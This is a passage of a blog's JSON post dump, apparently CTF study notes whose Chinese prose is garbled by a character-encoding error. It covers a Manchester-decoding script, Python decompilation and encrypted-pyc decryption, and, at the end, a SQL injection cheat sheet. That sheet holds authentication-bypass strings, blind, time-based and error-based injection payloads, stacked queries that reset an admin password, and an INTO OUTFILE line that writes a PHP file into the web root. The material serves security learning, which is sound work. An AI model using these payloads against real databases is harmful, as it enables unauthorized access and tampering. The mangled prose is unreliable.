å¤„ç†çš„æ—¶å€™ï¼Œå¾—è€ƒè™‘ä½¿ç”¨çš„è§„èŒƒå’Œå­—èŠ‚åºã€‚ æ›¼å½»æ–¯ç‰¹ç¼–ç æœ‰2ä¸ªä¸åŒçš„è§„èŒƒï¼Œåœ¨äºŒè¿›åˆ¶ä½çš„å‘é€æ–¹å¼ä¸Šè¿˜æœ‰æ­£åºå’Œé€†åºä¹‹åˆ†ï¼Œæ‰€ä»¥å¯¹ç»™å®šçš„ç¼–ç åçš„æ•°æ®è¿›è¡Œè§£ç å¤„ç†çš„æ—¶å€™ï¼Œå¾—è€ƒè™‘ä½¿ç”¨çš„è§„èŒƒå’Œå­—èŠ‚åºã€‚ 1. æ›¼å½»æ–¯ç‰¹ç¼–ç  æ ‡å‡†æ›¼å½»æ–¯ç‰¹ç¼–ç  ç”±G. E. Thomas, Andrew S. Tanenbaumç­‰äººåœ¨1949å¹´æå‡ºçš„ï¼Œå®ƒè§„å®š0æ˜¯ç”±ä½-é«˜çš„ç”µå¹³è·³å˜è¡¨ç¤ºï¼Œ1æ˜¯é«˜-ä½çš„ç”µå¹³è·³å˜ï¼Œå³01ä¸º0ï¼Œ10ä¸º1ã€‚ IEEEæ›¼å½»æ–¯ç‰¹ç¼–ç ï¼š åœ¨IEEE 802.4ï¼ˆä»¤ç‰Œæ€»çº¿ï¼‰å’Œä½é€Ÿç‰ˆçš„IEEE 802.3ï¼ˆä»¥å¤ªç½‘ï¼‰ä¸­è§„å®šï¼ŒæŒ‰ç…§è¿™æ ·çš„è¯´æ³•ï¼Œä½-é«˜ç”µå¹³è·³å˜è¡¨ç¤º1ï¼Œé«˜-ä½çš„ç”µå¹³è·³å˜è¡¨ç¤º0ï¼Œå³01ä¸º1ï¼Œ10ä¸º0ã€‚ 2. å·®åˆ†æ›¼å½»æ–¯ç‰¹ç¼–ç åä¸€ä¸ªä¿¡å·å¦‚æœä¸å‰ä¸€ä¸ªä¿¡å·è·³å˜ç›¸åŒï¼Œåˆ™ä¸º0ï¼Œä¸åŒï¼Œåˆ™ä¸º1ï¼Œä¾‹å¦‚ï¼Œ0101ï¼Œ1010ä¸º0ï¼Œ0110ï¼Œ1001ä¸º1ã€‚ç¬¬ä¸€ä¸ªä¿¡å·ä½å¦‚ä½•ç¡®å®šï¼ŒæŸ¥åˆ°æœ‰èµ„æ–™è¯´ï¼š å¦‚æœä¸­é—´ä½ç”µå¹³ä»ä½åˆ°é«˜ï¼Œåˆ™è¡¨ç¤º0ï¼›å¦‚æœä¸­é—´ä½ç”µå¹³ä»é«˜åˆ°ä½ï¼Œåˆ™è¡¨ç¤º1ï¼› ä½†æœ‰çš„é¢˜å¥½åƒåˆæ˜¯ç›´æ¥å¿½ç•¥ç¬¬ä¸€ä½ï¼Œå¾…è§£ã€‚ å…¶ä»–è§£æ³• åªæœ‰5ï¼Œ6ï¼Œ9ï¼Œaè¿™4ç§å­—ç¬¦ï¼š 5 - 0101ï¼›6 - 0110ï¼›9 - 1001ï¼›a - 1010ã€‚ ç„¶åè½¬æ¢ä¸º16è¿›åˆ¶ï¼Œå†è½¬æ¢æˆå­—ç¬¦ä¸²å³å¯è·å¾—flagã€‚ 3. å…³äºå­—èŠ‚é€†åºçš„é—®é¢˜åœ¨æŸä¸ªä¼ è¾“è§„èŒƒä¸­ï¼Œæ¯ä¸ªå­—èŠ‚çš„8ä¸ªæ¯”ç‰¹ä½ä¼šé€†åºå‘é€ï¼Œå¦‚å‘é€ï¼š01001001 10101010ï¼Œå‘é€é¡ºåºä¼šå˜æˆ10010010 01010101ã€‚å› æ­¤è¿™é‡Œä¹Ÿæ˜¯åšé¢˜ä¸­çš„ä¸€ä¸ªå‘ã€‚ 4. é€šç”¨ä»£ç ä»£ç åœ¨å·®åˆ†æ›¼å½»æ–¯ç‰¹ç¼–ç çš„è§£ç ä¸­ï¼Œä½¿ç”¨äº†å¿½ç•¥ç¬¬ä¸€ä½çš„æ–¹æ³•ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899# -*- coding: utf-8 -*-import structimport mathdef long_to_bytes(n): s = b&#x27;&#x27; pack = struct.pack while n &gt; 0: s = pack(&#x27;&gt;I&#x27;, n &amp; 0xffffffff) + s n = n &gt;&gt; 32 for i in range(len(s)): if s[i] != b&#x27;\\000&#x27;[0]: break else: s = b&#x27;\\000&#x27; i = 0 s = s[i:] return s#å­—èŠ‚é€†åºdef byteinvert(str_bin): ret=&#x27;&#x27; for i in range(len(str_bin)//8): ret+=str_bin[i*8:i*8+8][::-1] return ret#æ ‡å‡†æ›¼å½»æ–¯ç‰¹def MCST_stand(str_bin): ret=&#x27;&#x27; for i in range(len(str_bin)//2): x=str_bin[i*2:i*2+2] if x==&#x27;01&#x27;: ret+=&#x27;0&#x27; elif x==&#x27;10&#x27;: ret+=&#x27;1&#x27; else: return &#x27;stand manchester decode wrong!&#x27; return ret#IEEEè§„èŒƒçš„æ›¼å½»æ–¯ç‰¹def MCST_IEEE(str_bin): ret=&#x27;&#x27; for i in range(math.ceil(len(str_bin)/8)): x=str_bin[i*2:i*2+2] if x==&#x27;01&#x27;: ret+=&#x27;1&#x27; elif x==&#x27;10&#x27;: ret+=&#x27;0&#x27; else: return &#x27;stand manchester decode wrong!&#x27; return ret#å·®åˆ†æ›¼å½»æ–¯ç‰¹def MCST_diff(str_bin): ret=&#x27;&#x27; for i in range(0,len(str_bin)//2-1): x1=str_bin[i*2:i*2+2] x2=str_bin[i*2+2:i*2+4] if x1==x2: ret+=&#x27;0&#x27; else: ret+=&#x27;1&#x27; return retif __name__ == &quot;__main__&quot;: str_hex=&#x27;9a9a9a6a9aa9656699a699a566995956996a996aa6a965aa9a6aa596a699665a9aa699655a696569655a9a9a9a595a6965569a59665566955a6965a9596a99aa9a9566a699aa9a969969669aa6969a9559596669&#x27; #str_bin=&#x27;0101010101010101&#x27; str_bin=str(bin(int(str_hex,16)))[2:] m1=MCST_IEEE(str_bin) m2=MCST_stand(str_bin) m3=MCST_diff(str_bin) print(&#x27;\\nIEEEæ›¼å½»æ–¯ç‰¹:&#x27;) print(m1) print(hex(int(m1,2))) print(long_to_bytes(int(m1,2))) print(&#x27;\\n æ ‡å‡†æ›¼å½»æ–¯ç‰¹:&#x27;) print(m2) print(hex(int(m2,2))) print(long_to_bytes(int(m2,2))) print(&#x27;\\n å·®åˆ†æ›¼å½»æ–¯ç‰¹:&#x27;) print(m3) print(hex(int(m3,2))) print(long_to_bytes(int(m3,2))) print(&#x27;\\n=============å­—èŠ‚é€†åº=============&#x27;) m1=byteinvert(m1) m2=byteinvert(m2) m3=byteinvert(m3) print(&#x27;\\nIEEEæ›¼å½»æ–¯ç‰¹:&#x27;) print(m1) print(hex(int(m1,2))) print(long_to_bytes(int(m1,2))) print(&#x27;\\n æ ‡å‡†æ›¼å½»æ–¯ç‰¹:&#x27;) print(m2) print(hex(int(m2,2))) print(long_to_bytes(int(m2,2))) print(&#x27;\\n å·®åˆ†æ›¼å½»æ–¯ç‰¹:&#x27;) print(m3) print(hex(int(m3,2))) print(long_to_bytes(int(m3,2)))","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"ç¼–ç ","slug":"ç¼–ç ","permalink":"https://lazzzaro.github.io/tags/%E7%BC%96%E7%A0%81/"}],"author":"Lazzaro"},{"title":"pythonåç¼–è¯‘","slug":"reverse-pythonåç¼–è¯‘","date":"2020-05-16T10:29:46.000Z","updated":"2023-01-18T16:54:11.377Z","comments":true,"path":"2020/05/16/reverse-pythonåç¼–è¯‘/","permalink":"https://lazzzaro.github.io/2020/05/16/reverse-python%E5%8F%8D%E7%BC%96%E8%AF%91/","excerpt":"","text":"â€‹ pythonåç¼–è¯‘ .exe â†’ .pycpyinstxtractor https://github.com/extremecoders-re/pyinstxtractor https://github.com/countercept/python-exe-unpacker å‘½ä»¤ï¼š pyinstxtractor-ng [filename] python pyinstxtractor.py [filename] è½¬æ¢å‡ºæ¥çš„ä¸»ç¨‹åºæ ¼å¼ä¸å¯¹ï¼Œè¿˜éœ€è¦å¯¹å…¶è¿›è¡Œæ‰‹åŠ¨ä¿®å¤ã€‚ éœ€è¦åœ¨è¯¥æ–‡ä»¶èµ·å§‹ä½ç½®åŠ ä¸Š8ä¸ªå­—èŠ‚çš„pycå¤´ï¼Œç”±4å­—èŠ‚çš„magicå’Œ4å­—èŠ‚çš„æ—¶é—´æˆ³ç»„æˆï¼Œå…¶ä¸­magicä¼šå› ä¸ºpythonç‰ˆæœ¬çš„ä¸åŒè€Œä¸åŒï¼Œæœ‰ä¸ªæŠ€å·§å°±æ˜¯ï¼ŒæŸ¥çœ‹structæ–‡ä»¶çš„magicï¼Œç›´æ¥å¤åˆ¶è¿‡å»ï¼Œä¿å­˜ä¸º.pycæ–‡ä»¶ã€‚ Pyinstaller https://github.com/pyinstaller/pyinstaller å‘½ä»¤ï¼š pyi-archive_viewer [filename] python archive_viewer.py [filename] ä¸¤è€…å¯¹æ¯”æ–‡ä»¶å¤´ï¼Œæ·»åŠ 12å­—èŠ‚ï¼š ? x src ? x struct æ‰“å¼€æ–‡ä»¶å¤¹ï¼š ? o PYZ-00.pyz .pyc â†’ .pyåœ¨çº¿å·¥å…· https://tool.lu/pyc pycdc https://github.com/zrax/pycdc å‘½ä»¤ï¼š./pycdc [filename].pyc &gt; [output-filename].py uncompyle6 https://github.com/rocky/python-uncompyle6/ å‘½ä»¤ï¼šuncompyle6 [filename].pyc &gt; [output-filename].py ï¼ˆpython &lt; 3.9ï¼‰ pydumpck https://github.com/serfend/pydumpck å‘½ä»¤ï¼š 123456pydumpck xxx.exepydumpck xxx.elfpydumpck xxx.pycpydumpck xxx.pyzpydumpck xxx.exe --output ./output --thread 8 --timeout 10pydumpck xxx.exe -p pycdc uncompyle6 â€‹ pycæ–‡ä»¶æ¢å¤ï¼ˆå»æ··æ·†ï¼‰https://www.52pojie.cn/thread-912103-1-1.html å¸¸è§ç‰ˆæœ¬å¹»æ•°123456789101112Python 2.7: 03 f3 0d 0aPython 3.0: 3b 0c 0d 0aPython 3.1: 4f 0c 0d 0aPython 3.2: 6c 0c 0d 0aPython 3.3: 9e 0c 0d 0aPython 3.4: ee 0c 0d 0aPython 3.5: 17 0d 0d 0aPython 3.6: 33 0d 0d 0aPython 3.7: 42 0d 0d 0aPython 3.8: 55 0d 0d 0aPython 3.9: 61 0d 0d 0aPython 3.10: 6f 0d 0d 0a æ¢å¤bytecode12345678910111213141516171819202122#å®‰è£…ç¯å¢ƒimport dis, marshal, sysheader_sizes = [ # (size, first version this applies to) # pyc files were introduced in 0.9.2 way, way back in June 1991. (8, (0, 9, 2)), # 2 bytes magic number, \\r\\n, 4 bytes UNIX timestamp (12, (3, 6)), # added 4 bytes file size # bytes 4-8 are flags, meaning of 9-16 depends on what flags are set # bit 0 not set: 9-12 timestamp, 13-16 file size # bit 0 set: 9-16 file hash (SipHash-2-4, k0 = 4 bytes of the file, k1 = 0) (16, (3, 7)), # inserted 4 bytes bit flag field at 4-8 # future version may add more bytes still, at which point we can extend # this table. It is correct for Python versions up to 3.9]header_size = next(s for s, v in reversed(header_sizes) if sys.version_info &gt;= v)with open(&#x27;main.pyc&#x27;, &quot;rb&quot;) as f: metadata = f.read(header_size) # first header_size bytes are metadata code = marshal.load(f) # rest is a marshalled code objectdis.dis(code) â€‹ pycæ–‡ä»¶è§£å¯†åœ¨åç¼–è¯‘pythonç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶exeæ—¶ï¼Œå¼•ç”¨çš„ç±»åº“æ–‡ä»¶ç»å¸¸é‡åˆ°ä½¿ç”¨Cryptoæ¨¡å—AESç®—æ³•åŠ å¯†ï¼Œè§£åŒ…ç”Ÿæˆçš„å¹¶ä¸æ˜¯pycæ–‡ä»¶ï¼Œè€Œæ˜¯åŠ å¯†çš„pyc.encryptedæ–‡ä»¶ï¼Œå®ƒæ— æ³•æŸ¥çœ‹ç¼–è¯‘ã€‚ ç¬¬ä¸€æ­¥ï¼Œè·å–Cryptoçš„keyï¼Œè¿™æ˜¯æ‰“åŒ…æ—¶ç”±å¼€å‘è€…æŒ‡å®šçš„ã€‚è§£åŒ…å®Œæˆåå°†åœ¨æ ¹ç›®å½•å½¢æˆåä¸º pyimod00_crypto_key.pyc çš„æ–‡ä»¶ï¼Œå°†å®ƒè½¬ä¸ºpyæ–‡ä»¶å³å¯æŸ¥çœ‹keyæ–‡ä»¶ã€‚ ç¬¬äºŒæ­¥ï¼Œç¼–å†™è§£å¯†å¤„ç†çš„è„šæœ¬ä»£ç  12345678910111213141516171819202122232425262728293031323334import globimport zlibimport tinyaesfrom pathlib import Path CRYPT_BLOCK_SIZE = 16 # key obtained from pyimod00_crypto_keykey = bytes(&#x27;MySup3rS3cr3tK3y&#x27;, &#x27;utf-8&#x27;) for p in Path(&quot;PYZ-00.pyz_extracted&quot;).glob(&quot;**/*.pyc.encrypted&quot;): inf = open(p, &#x27;rb&#x27;) # encrypted file input outf = open(p.with_name(p.stem), &#x27;wb&#x27;) # output file # Initialization vector iv = inf.read(CRYPT_BLOCK_SIZE) cipher = tinyaes.AES(key, iv) # Decrypt and decompress plaintext = zlib.decompress(cipher.CTR_xcrypt_buffer(inf.read())) # Write pyc header # The header below is for Python 3.8 outf.write(b&#x27;\\x55\\x0d\\x0d\\x0a\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&#x27;) # Write decrypted data outf.write(plaintext) inf.close() outf.close() # Delete .pyc.encrypted file p.unlink() åœ¨å‰ä¸€æ­¥ä¸­è·å–çš„keyæ˜¯å¿…é¡»æ–‡ä»¶ï¼Œå¦åˆ™æ— æ³•è¿›è¡Œè§£å¯†ï¼›å¯¹äºä¸åŒpythonç‰ˆæœ¬å¤´æ–‡ä»¶ï¼ˆheaderï¼‰ä¹Ÿä¸ç›¸åŒï¼Œ2.7~3.10å¦‚ä¸‹ï¼š 123456789101112Python 2.7: \\x03\\xf3\\x0d\\x0a\\0\\0\\0\\0Python 3.0: \\x3b\\x0c\\x0d\\x0a\\0\\0\\0\\0Python 3.1: \\x4f\\x0c\\x0d\\x0a\\0\\0\\0\\0Python 3.2: \\x6c\\x0c\\x0d\\x0a\\0\\0\\0\\0Python 3.3: \\x9e\\x0c\\x0d\\x0a\\0\\0\\0\\0\\0\\0\\0\\0Python 3.4: \\xee\\x0c\\x0d\\x0a\\0\\0\\0\\0\\0\\0\\0\\0Python 3.5: \\x17\\x0d\\x0d\\x0a\\0\\0\\0\\0\\0\\0\\0\\0Python 3.6: \\x33\\x0d\\x0d\\x0a\\0\\0\\0\\0\\0\\0\\0\\0Python 3.7: \\x42\\x0d\\x0d\\x0a\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0Python 3.8: \\x55\\x0d\\x0d\\x0a\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0Python 3.9: \\x61\\x0d\\x0d\\x0a\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0Python 3.10: \\x6f\\x0d\\x0d\\x0a\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0 ç¬¬ä¸‰æ­¥ï¼Œæ‰§è¡Œè„šæœ¬æ–‡ä»¶ï¼Œå³å¯å°†åŠ å¯†çš„pyc.encryptedæ–‡ä»¶è½¬æˆä¸åŠ å¯†çš„pycæ–‡ä»¶ã€‚","categories":[{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"}],"tags":[{"name":"python","slug":"python","permalink":"https://lazzzaro.github.io/tags/python/"},{"name":"åç¼–è¯‘","slug":"åç¼–è¯‘","permalink":"https://lazzzaro.github.io/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/"}],"author":"Lazzaro"},{"title":"fuzzæ”¶é›†","slug":"web-fuzzæ”¶é›†","date":"2020-05-16T07:55:07.000Z","updated":"2020-05-16T07:57:54.874Z","comments":true,"path":"2020/05/16/web-fuzzæ”¶é›†/","permalink":"https://lazzzaro.github.io/2020/05/16/web-fuzz%E6%94%B6%E9%9B%86/","excerpt":"","text":"fuzzæ”¶é›† ä»»æ„æ–‡ä»¶è¯»å–https://github.com/ev0A/ArbitraryFileReadList","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"fuzz","slug":"fuzz","permalink":"https://lazzzaro.github.io/tags/fuzz/"}],"author":"Lazzaro"},{"title":"SQLæ³¨å…¥","slug":"web-SQLæ³¨å…¥","date":"2020-05-15T17:43:10.000Z","updated":"2023-10-07T16:44:26.692Z","comments":true,"path":"2020/05/16/web-SQLæ³¨å…¥/","permalink":"https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/","excerpt":"","text":"ä¸‡èƒ½å¯†ç 123456789admin&#x27; --admin&#x27; #admin&#x27;/\\*&#x27; or 1=1--&#x27; or 1=1#&#x27; or 1=1/*&#x27;) or &#x27;1&#x27;=&#x27;1--&#x27;) or (&#x27;1&#x27;=&#x27;1-- 1&#x27;^1# (Falseæ³¨å…¥) â€‹ æ‰‹æ³¨æ­£å¸¸æ³¨å…¥æ­¥éª¤ï¼ˆè”åˆæŸ¥è¯¢ï¼‰æŸ¥åº“å-&gt;æŸ¥è¡¨å-&gt;æŸ¥åˆ—åï¼ˆå­—æ®µåï¼‰-&gt;æŸ¥å€¼ï¼ˆæ•°æ®ï¼‰ å­—æ®µæ•°é‡çŒœè§£ 1order by 4 --+ åˆ¤æ–­é¡µé¢å›æ˜¾æ•°æ®å­—æ®µä½ç½® 1union select 1,2,3,4,x... --+ æ•°æ®åº“å 12345select database()select schema_name from information_schema.schemata;-- MySQL8æ–°ç‰¹æ€§(&gt;8.0.21)table information_schema.TABLESPACES_EXTENSIONS è¡¨å 1union select 1,2,group_concat(table_name),4,xxxx from information_schema.tables where table_schema=database() unionæŸ¥è¯¢ 12345UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database(); /* åˆ—å‡ºæ‰€æœ‰ç”¨æˆ·è‡ªå®šä¹‰æ•°æ®åº“ä¸­çš„è¡¨ */-- MySQL 4ç‰ˆæœ¬æ—¶ç”¨version=9ï¼ŒMySQL 5ç‰ˆæœ¬æ—¶ç”¨version=10UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10; /* åˆ—å‡ºå½“å‰æ•°æ®åº“ä¸­çš„è¡¨ */SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema!=&#x27;information_schema&#x27; AND table_schema!=&#x27;mysql&#x27;; ç›²æ³¨ 1234AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables &gt; &#x27;A&#x27;-- MySQL8æ–°ç‰¹æ€§and (table information_schema.TABLESPACES_EXTENSIONS limit 1,1)&gt;(BINARY(&#x27;a&#x27;),&#x27;0&#x27;)# æŠ¥é”™ 12AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));-- åœ¨5.1.5ç‰ˆæœ¬ä¸­æˆåŠŸã€‚ åˆ—åï¼ˆå­—æ®µåï¼‰ 1Union select 1,2,group_concat(column_name),4,xxxx from information_schema.columns where table_schema=database() and table_name=(table_name) /*æ­¤å¤„çš„è¡¨åä¸ºå­—ç¬¦ä¸²å‹ï¼Œä¹Ÿé€šè¿‡åå…­è¿›åˆ¶è¡¨ç¤º*/ unionæŸ¥è¯¢ 1UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = &#x27;tablename&#x27; ç›²æ³¨ 1AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; &#x27;A&#x27; æŠ¥é”™ 1234-- åœ¨5.1.5ç‰ˆæœ¬ä¸­æˆåŠŸAND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)-- MySQL 5.1ç‰ˆæœ¬ä¿®å¤äº†AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1))); å€¼æŸ¥è¯¢ 1234Union select 1,2,column_name,4,xxx from (database_name.)table_name-- MySQL8æ–°ç‰¹æ€§and (table flag limit 1,1)&gt;(BINARY(&#x27;a&#x27;))# æ— å›æ˜¾ ç›²æ³¨ å¸ƒå°”ç›²æ³¨ä½¿ç”¨åœºæ™¯ï¼šå¯¹çœŸ/å‡æ¡ä»¶è¿”å›çš„å†…å®¹å¾ˆå®¹æ˜“åŒºåˆ†ã€‚ 1234567(where | and) if(substr((select password from users where username=&#x27;admin&#x27;),1,1)=&#x27;a&#x27;,1,0)select * from users where username=nouser or length(database())&gt;8select * from users where username=nouser or ascii(substr(database(),1,1))&lt;130-- é€šé…ç¬¦select * from users where username=&#x27;xxx&#x27; and passwd=&#x27;-1&#x27; or passwd like &#x27;&#123;&#125;%&#x27;# æ—¶é—´ç›²æ³¨ä¾èµ–äºé€šè¿‡é¡µé¢è¿”å›çš„å»¶è¿Ÿæ—¶é—´æ¥åˆ¤æ–­æ¡ä»¶æ˜¯å¦æ­£ç¡®ã€‚ é€šå¸¸å¯åˆ©ç”¨çš„äº§ç”Ÿæ—¶é—´å»¶è¿Ÿçš„å‡½æ•°æœ‰ï¼šsleep()ã€benchmark()ï¼Œè¿˜æœ‰è®¸å¤šè¿›è¡Œå¤æ‚è¿ç®—çš„å‡½æ•°ä¹Ÿå¯ä»¥å½“åšå»¶è¿Ÿçš„åˆ¤æ–­æ ‡å‡†ã€ç¬›å¡å°”ç§¯åˆå¹¶æ•°æ®è¡¨ã€GET_LOCKåŒSESSIONäº§ç”Ÿå»¶è¿Ÿç­‰æ–¹æ³•ã€‚ 1234567891011121314151617-- sleep()(where | and) if(substr((select password from users where username=&#x27;admin&#x27;),1,1)=&#x27;a&#x27;,sleep(3),1)select * from users where username=$username (and | or) if(length(database())&gt;8,sleep(3),1)-- benchmark()or benchmark(5000000,md5(&#x27;test&#x27;))or if(length(database())&gt;5,benchmark(1500000,md5(&#x27;test&#x27;)),1)-- pg_sleep()(and | or) (case when (select substr(password,1,1) from users)=&#x27;a&#x27; then pg_sleep(5) else pg_sleep(0) end)and (select case when(substr((select password from users where username=&#x27;admin&#x27;),1,1)=&#x27;a&#x27;) then (select &#x27;roarctf&#x27; from pg_sleep(3)) else &#x27;1&#x27; end)=&#x27;roarctf&#x27;-- ç¬›å¡å°”ç§¯ heavy queryselect * from users where id=1 and 1&gt;(select count(*) from information_schema.columns A, information_schema.columns B, information_schema.columns C);select * from users where id=1 and if(1,concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;,0) and &#x27;1&#x27;=&#x27;1&#x27;; æŠ¥é”™æ³¨å…¥é€šè¿‡ç‰¹æ®Šå‡½æ•°çš„é”™è¯¯ä½¿ç”¨ä½¿å…¶å‚æ•°è¢«é¡µé¢è¾“å‡ºã€‚ å‰æï¼šæœåŠ¡å™¨å¼€å¯æŠ¥é”™ä¿¡æ¯è¿”å›ï¼Œä¹Ÿå°±æ˜¯å‘ç”Ÿé”™è¯¯æ—¶è¿”å›æŠ¥é”™ä¿¡æ¯ã€‚ å¸¸è§çš„åˆ©ç”¨å‡½æ•°æœ‰ï¼šexp()ã€floor()+rand()ã€updatexml()ã€extractvalue()ç­‰ã€‚ 123456(where|and|or) exp(~(select * from(select user())a));(where|and|or) pow(~(select * from(select user())a),9999);(where|and|or) updatexml(1,concat(0x7e,(select user()),0x7e),1);(where|and|or) extractvalue(1,concat(0x7e,(select user()),0x7e));(where|and|or) (select count(*) from information_schema.tables group by concat((select user()),0x7e,floor(rand(0)*2)));(where|and|or) (select count(*) from information_schema.tables group by concat((select user()),0x7e,ceil(rand(0)*2))); limitæ³¨å…¥ä½¿ç”¨ PROCEDUREå‡½æ•°è¿›è¡Œæ³¨å…¥ï¼ŒANALYSEæ”¯æŒä¸¤ä¸ªå‚æ•°ã€‚ 123select id from users order by id desc limit 0,1 procedure analyse(1,1);select id from users order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);select id from users order by id desc limit 0,1 into outfile &quot;/var/www/html/1.php&quot; LINES TERMINATED BY 0x16è¿›åˆ¶æ–‡ä»¶ updateæ³¨å…¥123#ç›²æ³¨update users set username = &#x27;0&#x27;|if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) where id=15;update users set username = &#x27;0&#x27; | (substr(user(),1,1) regexp 0x5e5b6d2d7a5d) where id=14; insertæ³¨å…¥123#ç›²æ³¨insert into users values (16,&#x27;K0rz3n&#x27;,&#x27;0&#x27;| if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1));insert into users values (15,&#x27;K0rz3n&#x27;,&#x27;0&#x27;| (substr(user(),1,1) regexp 0x5e5b6d2d7a5d)); order byæ³¨å…¥12345#æŠ¥é”™æ³¨å…¥select * from users order by updatexml(1,concat(0x7e,(select%20user()),0x7e),1);#ç›²æ³¨select * from users order by id ^(select(select version()) regexp &#x27;^5&#x27;); group byæ³¨å…¥12#ç›²æ³¨select * from users group by 1 having substr((select database()),1,1)=&#x27;c&#x27; å®½å­—èŠ‚æ³¨å…¥å›½å†…æœ€å¸¸ä½¿ç”¨çš„ GBK ç¼–ç ï¼Œè¿™ç§æ–¹å¼ä¸»è¦æ˜¯ç»•è¿‡ addslashes ç­‰å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ç§»çš„ç»•è¿‡ã€‚åæ–œæ  \\ çš„åå…­è¿›åˆ¶ä¸º %5cï¼Œåœ¨ä½ è¾“å…¥ %bf%27 æ—¶ï¼Œå‡½æ•°é‡åˆ°å•å¼•å·è‡ªåŠ¨è½¬ç§»åŠ å…¥ \\ï¼Œæ­¤æ—¶å˜ä¸º %bf%5c%27ï¼Œ%bf%5c åœ¨ GBK ä¸­å˜ä¸ºä¸€ä¸ªå®½å­—ç¬¦ã€Œç¸—ã€ã€‚%bf é‚£ä¸ªä½ç½®å¯ä»¥æ˜¯ %81-%fe ä¸­é—´çš„ä»»ä½•å­—ç¬¦ã€‚ä¸æ­¢åœ¨ SQL æ³¨å…¥ä¸­ï¼Œå®½å­—ç¬¦æ³¨å…¥åœ¨å¾ˆå¤šåœ°æ–¹éƒ½å¯ä»¥åº”ç”¨ã€‚ GETæ–¹å¼ï¼šåˆ©ç”¨URLencode ?id=1%df&#39;||1=&#123;payload&#125;%23 POSTæ–¹å¼ï¼šåˆ©ç”¨UTF-16æˆ–UTF-32æˆ–ä¸­æ–‡ ?id=1æˆ‘&#39;||1=&#123;payload&#125;# â€‹ å †å æ³¨å…¥ç”±äºåˆ†å·;ä¸ºMYSQLè¯­å¥çš„ç»“æŸç¬¦ã€‚è‹¥åœ¨æ”¯æŒå¤šè¯­å¥æ‰§è¡Œçš„æƒ…å†µä¸‹ï¼Œå¯åˆ©ç”¨æ­¤æ–¹æ³•æ‰§è¡Œå…¶ä»–æ¶æ„è¯­å¥ï¼Œå¦‚RENAMEã€DROPç­‰ã€‚ 1234567891011121;show databases;#1;show tables;#1;show columns from [è¡¨å];#1;update`ctfshow_user`set`pass`=(0x31323334)where(username=0x61646d696e)/*é¢„å¤„ç†*/1;PREPARE hacker from char(117,112,100,97,116,101,96,99,116,102,115,104,111,119,95,117,115,101,114,96,115,101,116,96,112,97,115,115,96,61,40,48,120,51,49,51,50,51,51,51,52,41,119,104,101,114,101,40,117,115,101,114,110,97,109,101,61,48,120,54,49,54,52,54,100,54,57,54,101,41);EXECUTE hacker;#1;PREPARE hacker from 0x7570646174656063746673686f775f75736572607365746070617373603d283078333133323333333429776865726528757365726e616d653d30783631363436643639366529;EXECUTE hacker;#1&#x27;;SET @sqli=char(117,112,100,97,116,101,96,99,116,102,115,104,111,119,95,117,115,101,114,96,115,101,116,96,112,97,115,115,96,61,40,48,120,51,49,51,50,51,51,51,52,41,119,104,101,114,101,40,117,115,101,114,110,97,109,101,61,48,120,54,49,54,52,54,100,54,57,54,101,41);PREPARE hacker from @sqli;EXECUTE hacker;#1&#x27;;SET @sqli=0x7570646174656063746673686f775f75736572607365746070617373603d283078333133323333333429776865726528757365726e616d653d30783631363436643639366529;PREPARE hacker from @sqli;EXECUTE hacker;# 